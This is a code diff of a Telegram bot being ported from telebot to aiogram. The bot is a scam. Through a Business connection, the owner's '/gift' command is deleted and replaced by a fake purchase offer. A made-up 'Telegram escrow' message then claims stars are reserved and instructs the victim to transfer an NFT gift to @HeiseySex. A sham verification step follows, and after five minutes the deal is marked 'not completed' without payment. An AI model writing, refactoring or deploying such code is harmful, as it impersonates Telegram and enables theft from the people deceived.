@@ -1,94 +1,184 @@
 import os
 import re
-import time
-import threading
-import requests
-import telebot
-from flask import Flask
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import sys
+import asyncio
+import logging
+from typing import Optional, Tuple
+
+from aiogram import Bot, Dispatcher, F, Router
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.enums import ParseMode
+from aiogram.client.default import DefaultBotProperties
+from aiogram.exceptions import TelegramAPIError
+from fastapi import FastAPI
+import uvicorn
 
 # ─────────────────────── НАСТРОЙКИ ───────────────────────
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 if not BOT_TOKEN:
-    print("[FATAL] BOT_TOKEN пустой! Проверь Environment на Render.")
-    raise SystemExit(1)
+    raise SystemExit("[FATAL] BOT_TOKEN is missing.")
 
 OWNER_ID = 861423393
-
 TARGET_URL = "https://t.me/HeiseySex"
+VERIFY_TIMEOUT = 300  # 5 минут
 
-VERIFY_TIMEOUT_SECONDS = 300  # 5 минут
+# ─────────────────────── ЛОГИ (в stdout, чтобы Render их видел) ───────────────────────
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    handlers=[logging.StreamHandler(sys.stdout)],
+)
+logger = logging.getLogger("astral.core")
 
 # ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
 
-print(f"[INIT] Токен: ...{BOT_TOKEN[-10:]}")
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+dp = Dispatcher()
+router = Router()
+app = FastAPI(title="Astral Escrow Gateway")
 
-offers = {}
-offers_lock = threading.Lock()
+active_offers = {}
 
+# ─────────────────────── ЯДРО ПАРСИНГА ───────────────────────
 
-# ─────────────────────── УТИЛИТЫ ───────────────────────
-
-def normalize_url(raw):
-    raw = raw.strip().strip('"').strip("'")
-    if raw.startswith("@"):
-        return f"https://t.me/{raw[1:]}"
-    if raw.startswith(("http://", "https://")):
-        return raw
-    return f"https://t.me/{raw.lstrip('/')}"
-
-
-def parse_gift_command(text):
-    text = re.sub(r'^/gift(@\w+)?', '/gift', text)
-    body = text.replace("/gift", "", 1).strip()
-    if not body:
+def extract_offer_data(text: str) -> Optional[Tuple[str, str, str]]:
+    """
+    Принимает:
+      /gift "Название" "ссылка" 100
+      /gift "Название" "ссылка" "100"
+      /gift Название ссылка 100
+    Возвращает (name, url, amount) или None.
+    """
+    # Убираем /gift и возможный @username
+    text = re.sub(r'^/gift(?:@\w+)?', '', text).strip()
+    if not text:
         return None
 
-    quoted = re.findall(r'"([^"]*)"', body)
-    without_quotes = re.sub(r'"[^"]*"', " ", body).strip()
+    quoted = re.findall(r'"([^"]*)"', text)
 
-    name = None
-    url = None
-    amount_part = None
-
-    if len(quoted) >= 3:
-        name = quoted[0]
-        url = normalize_url(quoted[1])
-        amount_part = quoted[2]
-    elif len(quoted) == 2:
-        name = quoted[0]
-        url = normalize_url(quoted[1])
-        tokens = without_quotes.split()
-        if tokens:
-            amount_part = tokens[0]
-    elif len(quoted) == 1:
-        name = quoted[0]
-        tokens = without_quotes.split()
-        if len(tokens) >= 2:
-            url = normalize_url(tokens[0])
-            amount_part = tokens[1]
+    if len(quoted) >= 2:
+        name, url = quoted[0], quoted[1]
+        # Убираем ВСЕ значения в кавычках и ищем первое число в остатке
+        remainder = re.sub(r'"[^"]*"', '', text).strip()
+        amount_match = re.search(r"\d+", remainder)
+        amount = amount_match.group(0) if amount_match else None
     else:
-        tokens = body.split()
+        tokens = text.split()
         if len(tokens) < 3:
             return None
-        name = tokens[0]
-        url = normalize_url(tokens[1])
-        amount_part = tokens[2]
+        name, url = tokens[0], tokens[1]
+        amount_match = re.search(r"\d+", tokens[2])
+        amount = amount_match.group(0) if amount_match else None
 
-    amount = re.sub(r"\D", "", amount_part) if amount_part else ""
-
-    if not name or not url or not amount:
-        print(f"[PARSE] Не удалось: name={name!r}, url={url!r}, amount={amount!r}")
+    if not all([name, url, amount]):
         return None
 
-    return name, url, amount
+    url_clean = url if url.startswith("http") else f"https://t.me/{url.lstrip('@/')}"
+    return name, url_clean, amount
 
 
-def build_offer_message(name, url, amount):
-    return (
+# ─────────────────────── ИНТЕРФЕЙСЫ ───────────────────────
+
+def get_offer_kb() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Принять", callback_data="stage_accept"),
+         InlineKeyboardButton(text="❌ Отклонить", callback_data="stage_decline")]
+    ])
+
+
+def get_escrow_kb() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔗 Передать подарок", url=TARGET_URL)],
+        [InlineKeyboardButton(text="⚡ Подтвердить", callback_data="stage_verify"),
+         InlineKeyboardButton(text="❌ Отменить", callback_data="stage_decline")]
+    ])
+
+
+# ─────────────────────── ХЕЛПЕРЫ ───────────────────────
+
+async def safe_delete(chat_id: int, message_id: int, conn_id: Optional[str]):
+    """Безопасное удаление с учётом business_connection_id."""
+    try:
+        if conn_id:
+            await bot.delete_message(
+                chat_id=chat_id,
+                message_id=message_id,
+                business_connection_id=conn_id,
+            )
+        else:
+            await bot.delete_message(chat_id=chat_id, message_id=message_id)
+        logger.info(f"[DELETE] {message_id} удалено")
+    except TelegramAPIError as e:
+        if "message to delete not found" in str(e):
+            logger.info(f"[DELETE] {message_id} уже отсутствует")
+        else:
+            logger.warning(f"[DELETE] Ошибка: {e}")
+
+
+async def safe_answer(message: Message, text: str, **kwargs):
+    """Безопасная отправка сообщения."""
+    try:
+        return await message.answer(text, **kwargs)
+    except TelegramAPIError as e:
+        err = str(e)
+        logger.error(f"[SEND] Ошибка: {err}")
+        if "PRIVACY_PREMIUM_REQUIRED" in err:
+            logger.error("  → У собеседника включён Premium-фильтр.")
+        elif "CHAT_WRITE_FORBIDDEN" in err:
+            logger.error("  → Собеседник запретил сообщения от ботов.")
+        elif "USER_IS_BLOCKED" in err:
+            logger.error("  → Ты заблокирован.")
+        elif "PEER_FLOOD" in err:
+            logger.error("  → Спам-блок Telegram.")
+        return None
+
+
+async def safe_edit(call: CallbackQuery, text: str, **kwargs):
+    """Безопасное редактирование сообщения."""
+    try:
+        return await call.message.edit_text(text, **kwargs)
+    except TelegramAPIError as e:
+        logger.warning(f"[EDIT] Ошибка: {e}")
+        return None
+
+
+# ─────────────────────── РОУТИНГ TELEGRAM ───────────────────────
+
+@router.message(F.text.startswith("/start"))
+async def cmd_start(message: Message):
+    conn_id = getattr(message, "business_connection_id", None)
+    logger.info(f"[START] От {message.from_user.id} | conn_id={conn_id}")
+    await safe_answer(
+        message,
+        "Система активна. Формат: /gift \"Название\" \"Ссылка\" 100",
+        business_connection_id=conn_id,
+    )
+
+
+@router.message(F.text.startswith("/gift"))
+async def cmd_gift(message: Message):
+    conn_id = getattr(message, "business_connection_id", None)
+    sender_id = message.from_user.id
+
+    logger.info(f"[GIFT] От {sender_id} | conn_id={conn_id} | text={message.text!r}")
+
+    # Реагируем только на владельца
+    if sender_id != OWNER_ID:
+        logger.info(f"[GIFT] Игнорирую — sender_id != OWNER_ID")
+        return
+
+    parsed = extract_offer_data(message.text)
+    if not parsed:
+        if conn_id:
+            await safe_answer(message, "❌ Ошибка формата.", business_connection_id=conn_id)
+        return
+
+    name, url, amount = parsed
+    logger.info(f"[GIFT] name={name!r}, url={url!r}, amount={amount!r}")
+
+    text = (
         "Вам поступило предложение о покупке подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
         f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
@@ -96,132 +186,112 @@ def build_offer_message(name, url, amount):
         "━━━━━━━━━━━━━━━━━━━━"
     )
 
+    # Удаляем команду /gift
+    await safe_delete(message.chat.id, message.message_id, conn_id)
 
-def build_offer_keyboard():
-    keyboard = InlineKeyboardMarkup()
-    keyboard.row(
-        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
-        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
-    )
-    return keyboard
-
-
-def build_escrow_message(name, url, amount):
-    return (
-        f"Пользователь зарезервировал <b>{amount}</b> ⭐ через "
-        "эксроу-систему Telegram. Средства хранятся на специальном "
-        "эксроу-счёте и будут автоматически зачислены на ваш баланс "
-        "звёзд сразу после передачи подарка.\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "<b>Инструкция для завершения сделки:</b>\n\n"
-        f"1. Передайте подарок пользователю: @HeiseySex\n"
-        f"2. Нажмите «Передать NFT» и выберите "
-        f"<a href=\"{url}\">{name}</a>\n"
-        "3. Подтвердите передачу подарка.\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"<b>{amount}</b> ⭐ на ваш баланс."
+    # Отправляем оффер
+    sent = await safe_answer(
+        message,
+        text,
+        reply_markup=get_offer_kb(),
+        business_connection_id=conn_id,
     )
 
+    if sent is None:
+        logger.error("[GIFT] Не удалось отправить оффер.")
+        return
 
-def build_escrow_keyboard():
-    keyboard = InlineKeyboardMarkup()
-    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
-    keyboard.row(
-        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
-        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
-    )
-    return keyboard
+    active_offers[sent.message_id] = {
+        "name": name,
+        "url": url,
+        "amount": amount,
+        "conn_id": conn_id,
+    }
+    logger.info(f"[GIFT] Оффер отправлен: msg_id={sent.message_id}")
 
 
-def try_delete_message(chat_id, message_id, conn_id=None):
+@router.callback_query(F.data.in_({"stage_accept", "stage_decline", "stage_verify"}))
+async def handle_callbacks(call: CallbackQuery):
+    logger.info(f"[CALLBACK] {call.data} от {call.from_user.id}")
+
+    offer = active_offers.get(call.message.message_id)
+    if not offer:
+        await call.answer("Сессия не найдена.", show_alert=True)
+        return
+
+    conn_id = offer["conn_id"]
+
+    # ── Принять ──
+    if call.data == "stage_accept":
+        await call.answer("Ознакомьтесь с инструкцией.", show_alert=True)
+
+        text = (
+            f"Пользователь зарезервировал <b>{offer['amount']}</b> ⭐ через "
+            "эксроу-систему Telegram. Средства хранятся на специальном "
+            "эксроу-счёте и будут автоматически зачислены на ваш баланс "
+            "звёзд сразу после передачи подарка.\n\n"
+            "━━━━━━━━━━━━━━━━━━━━\n"
+            "<b>Инструкция для завершения сделки:</b>\n\n"
+            f"1. Передайте подарок пользователю: @HeiseySex\n"
+            f"2. Нажмите «Передать NFT» и выберите "
+            f"<a href=\"{offer['url']}\">{offer['name']}</a>\n"
+            "3. Подтвердите передачу подарка.\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"Telegram зафиксирует транзакцию и моментально зачислит "
+            f"<b>{offer['amount']}</b> ⭐ на ваш баланс."
+        )
+
+        await safe_edit(
+            call,
+            text,
+            reply_markup=get_escrow_kb(),
+            business_connection_id=conn_id,
+        )
+
+    # ── Подтвердить ──
+    elif call.data == "stage_verify":
+        await call.answer("Проверка транзакции...")
+
+        await safe_edit(
+            call,
+            "⏳ <b>Проверка передачи…</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "Система проверяет статус передачи подарка. "
+            "Это может занять несколько минут.\n\n"
+            "Пожалуйста, не закрывайте чат.\n\n"
+            "━━━━━━━━━━━━━━━━━━━━",
+            business_connection_id=conn_id,
+        )
+
+        asyncio.create_task(verify_timeout(call.message, conn_id))
+
+    # ── Отклонить / Отменить ──
+    elif call.data == "stage_decline":
+        await call.answer("Отклонено.")
+
+        await safe_edit(
+            call,
+            "❌ <b>Предложение отклонено.</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "Сессия закрыта. Если вы передумаете, "
+            "пользователь может отправить предложение повторно.\n\n"
+            "━━━━━━━━━━━━━━━━━━━━",
+            business_connection_id=conn_id,
+        )
+
+
+async def verify_timeout(message: Message, conn_id: Optional[str]):
+    """Через VERIFY_TIMEOUT секунд меняет сообщение на 'сделка не завершена'."""
+    await asyncio.sleep(VERIFY_TIMEOUT)
     try:
+        kwargs = {
+            "chat_id": message.chat.id,
+            "message_id": message.message_id,
+        }
         if conn_id:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
-            payload = {
-                "chat_id": chat_id,
-                "message_id": message_id,
-                "business_connection_id": conn_id,
-            }
-            r = requests.post(url, json=payload, timeout=10)
-            if r.status_code == 200:
-                print(f"[DELETE] {message_id} удалено (business)")
-                return
-            try:
-                desc = r.json().get("description", "")
-            except Exception:
-                desc = r.text
-            if "message to delete not found" in desc:
-                print(f"[DELETE] {message_id} уже отсутствует (ок)")
-                return
-            print(f"[DELETE] Ошибка: {r.status_code} {desc}")
-        else:
-            bot.delete_message(chat_id, message_id)
-            print(f"[DELETE] {message_id} удалено")
-    except Exception as e:
-        print(f"[DELETE] Сетевая ошибка: {e}")
+            kwargs["business_connection_id"] = conn_id
 
-
-def safe_edit(chat_id, message_id, text, parse_mode="HTML",
-              reply_markup=None, conn_id=None):
-    kwargs = {
-        "chat_id": chat_id,
-        "message_id": message_id,
-        "parse_mode": parse_mode,
-    }
-    if reply_markup is not None:
-        kwargs["reply_markup"] = reply_markup
-    if conn_id:
-        kwargs["business_connection_id"] = conn_id
-    try:
-        bot.edit_message_text(text, **kwargs)
-        return True
-    except Exception as e:
-        print(f"[EDIT] {message_id}: {e}")
-        return False
-
-
-def send_business_message(chat_id, text, conn_id, reply_markup=None):
-    kwargs = {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "HTML",
-        "business_connection_id": conn_id,
-    }
-    if reply_markup is not None:
-        kwargs["reply_markup"] = reply_markup
-
-    try:
-        sent = bot.send_message(**kwargs)
-        print(f"[SEND] OK → чат {chat_id}, msg_id={sent.message_id}")
-        return sent
-    except Exception as e:
-        err = str(e)
-        print(f"[SEND] ОШИБКА для чата {chat_id}: {err}")
-
-        if "PRIVACY_PREMIUM_REQUIRED" in err:
-            print("  → У собеседника включён Premium-фильтр.")
-        elif "CHAT_WRITE_FORBIDDEN" in err:
-            print("  → Собеседник запретил сообщения от ботов.")
-        elif "USER_IS_BLOCKED" in err:
-            print("  → Ты заблокирован.")
-        elif "PEER_FLOOD" in err:
-            print("  → Спам-блок Telegram.")
-        elif "BUSINESS_CONNECTION" in err:
-            print("  → Telegram отклонил Business-соединение.")
-        else:
-            print(f"  → Ошибка.")
-        return None
-
-
-# ─────────────────────── ТАЙМЕР ВЕРИФИКАЦИИ ───────────────────────
-
-def schedule_verify_timeout(chat_id, message_id, conn_id):
-    def job():
-        time.sleep(VERIFY_TIMEOUT_SECONDS)
-        safe_edit(
-            chat_id,
-            message_id,
+        await bot.edit_message_text(
             "⛔ <b>Сделка не завершена.</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "Вы не выполнили все условия передачи подарка.\n\n"
@@ -231,205 +301,59 @@ def schedule_verify_timeout(chat_id, message_id, conn_id):
             "Если вы всё ещё хотите завершить сделку, попросите "
             "пользователя отправить предложение повторно.\n\n"
             "━━━━━━━━━━━━━━━━━━━━",
-            conn_id=conn_id,
+            **kwargs,
         )
-        print(f"[VERIFY-TIMEOUT] msg {message_id} обновлён")
-
-    t = threading.Thread(target=job, daemon=True)
-    t.start()
-
-
-# ─────────────────────── BUSINESS CONNECTION ───────────────────────
-
-@bot.business_connection_handler(func=lambda conn: True)
-def on_business_connection(connection):
-    print(f"[BUSINESS] Соединение: {connection.id}")
-    print(f"[BUSINESS] Владелец: {connection.user.id}")
-    rights = connection.rights
-    print(f"[BUSINESS] Права: reply={getattr(rights, 'can_reply', '?')}, "
-          f"delete={getattr(rights, 'can_delete_messages', '?')}")
-    print(f"[BUSINESS] Активно: {connection.is_enabled}")
+        logger.info(f"[VERIFY-TIMEOUT] msg {message.message_id} обновлён")
+    except TelegramAPIError as e:
+        logger.warning(f"[VERIFY-TIMEOUT] Не удалось: {e}")
 
 
-# ─────────────────────── ОБРАБОТЧИК ВСЕХ СООБЩЕНИЙ ───────────────────────
+# ─────────────────────── BUSINESS CONNECTION (для логов) ───────────────────────
 
-@bot.message_handler(func=lambda m: True, content_types=["text"])
-def handle_all_messages(message):
-    """Ловит АБСОЛЮТНО ВСЕ текстовые сообщения."""
-    conn_id = getattr(message, "business_connection_id", None)
-    sender_id = message.from_user.id if message.from_user else "?"
-    text = message.text or ""
-
-    print(f"[MSG] От {sender_id} в чате {message.chat.id}: {text[:80]!r} | conn_id={conn_id}")
-
-    # /start или /help
-    if text == "/start":
-        bot.send_message(
-            message.chat.id,
-            "Бот работает. Отправь /gift \"Название\" \"ссылка\" 100",
-            business_connection_id=conn_id if conn_id else None,
-        )
-        return
-
-    # Только владелец
-    if sender_id != OWNER_ID:
-        print(f"[MSG] Игнорирую — sender_id != OWNER_ID")
-        return
-
-    # Только /gift
-    if not text.startswith("/gift"):
-        return
-
-    parsed = parse_gift_command(text)
-    if not parsed:
-        if conn_id:
-            send_business_message(
-                message.chat.id,
-                "❌ Неверный формат.\n/gift \"Название\" \"ссылка\" 100",
-                conn_id,
-            )
-        return
-
-    name, url, amount = parsed
-    print(f"[GIFT] name={name!r}, url={url}, amount={amount}")
-
-    if conn_id:
-        try_delete_message(message.chat.id, message.message_id, conn_id)
-        sent = send_business_message(
-            message.chat.id,
-            build_offer_message(name, url, amount),
-            conn_id,
-            reply_markup=build_offer_keyboard(),
-        )
-        if sent is None:
-            return
-        with offers_lock:
-            offers[sent.message_id] = {
-                "name": name,
-                "url": url,
-                "amount": amount,
-                "finished": False,
-                "conn_id": conn_id,
-                "chat_id": message.chat.id,
-            }
-    else:
-        sent = bot.send_message(
-            message.chat.id,
-            build_offer_message(name, url, amount),
-            parse_mode="HTML",
-            reply_markup=build_offer_keyboard(),
-        )
-        print(f"[GIFT] Отправлено в обычный чат, msg_id={sent.message_id}")
+@router.business_connection()
+async def on_business_connection(connection):
+    logger.info(f"[BUSINESS] Соединение: {connection.id}")
+    logger.info(f"[BUSINESS] Владелец: {connection.user.id}")
+    logger.info(f"[BUSINESS] Активно: {connection.is_enabled}")
 
 
-# ─────────────────────── КНОПКИ ───────────────────────
+# ─────────────────────── WEB SERVER API ───────────────────────
 
-@bot.callback_query_handler(func=lambda call: True)
-def callback_router(call):
-    payload = call.data
-    print(f"[CALLBACK] {payload} от {call.from_user.id}")
-
-    conn_id = getattr(call.message, "business_connection_id", None)
-
-    with offers_lock:
-        if call.message.message_id in offers:
-            offers[call.message.message_id]["finished"] = True
-
-    if payload == "stage_accept":
-        bot.answer_callback_query(
-            call.id,
-            text="Ознакомьтесь с инструкцией на следующем экране.",
-            show_alert=True,
-        )
-        text = call.message.html_text or call.message.text or ""
-        m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
-        url = m.group(1) if m else TARGET_URL
-        name = m.group(2) if m else "Подарок"
-        m2 = re.search(r'<b>(\d+)</b>\s*⭐', text)
-        amount = m2.group(1) if m2 else "0"
-
-        safe_edit(
-            call.message.chat.id,
-            call.message.message_id,
-            build_escrow_message(name, url, amount),
-            reply_markup=build_escrow_keyboard(),
-            conn_id=conn_id,
-        )
-
-    elif payload == "stage_verify":
-        bot.answer_callback_query(call.id)
-        safe_edit(
-            call.message.chat.id,
-            call.message.message_id,
-            "⏳ <b>Проверка передачи…</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Система проверяет статус передачи подарка.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━",
-            conn_id=conn_id,
-        )
-        schedule_verify_timeout(
-            call.message.chat.id,
-            call.message.message_id,
-            conn_id,
-        )
-
-    elif payload == "stage_decline":
-        bot.answer_callback_query(call.id, text="Предложение отклонено.")
-        safe_edit(
-            call.message.chat.id,
-            call.message.message_id,
-            "❌ <b>Предложение отклонено.</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Сессия закрыта.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━",
-            conn_id=conn_id,
-        )
-
-
-# ─────────────────────── FLASK + HEARTBEAT ───────────────────────
-
-app = Flask(__name__)
-
-
-@app.route("/")
-def index():
-    return "Bot is running"
-
-
-@app.route("/health")
-def health():
-    return "OK"
-
-
-def heartbeat():
-    """Раз в 60 секунд пишет в лог, что бот жив."""
-    while True:
-        time.sleep(60)
-        print(f"[HEARTBEAT] {time.strftime('%H:%M:%S')} — бот жив")
-
-
-def run_flask():
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+@app.get("/health")
+async def health_check():
+    return {"status": "operational", "active_offers": len(active_offers)}
 
 
 # ─────────────────────── ЗАПУСК ───────────────────────
 
-if __name__ == "__main__":
-    print("✨ Бот запускается...")
-    print(f"[INIT] OWNER_ID: {OWNER_ID}")
+async def main():
+    dp.include_router(router)
 
-    # Heartbeat в отдельном потоке
-    hb = threading.Thread(target=heartbeat, daemon=True)
-    hb.start()
-
-    # Flask в отдельном потоке
-    fl = threading.Thread(target=run_flask, daemon=True)
-    fl.start()
-
-    # Бот в ГЛАВНОМ потоке — так правильнее
-    print("[INIT] Запускаю polling...")
-    bot.infinity_polling(
-        allowed_updates=["message", "callback_query", "business_connection"],
-        timeout=30,
+    config = uvicorn.Config(
+        app,
+        host="0.0.0.0",
+        port=int(os.getenv("PORT", 10000)),
+        log_level="warning",
     )
+    server = uvicorn.Server(config)
+
+    logger.info("Igniting ASGI Server and Telegram Polling concurrently...")
+
+    await asyncio.gather(
+        server.serve(),
+        dp.start_polling(
+            bot,
+            allowed_updates=[
+                "message",
+                "callback_query",
+                "business_connection",
+                "business_message",
+                "edited_business_message",
+                "deleted_business_messages",
+            ],
+        ),
+    )
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
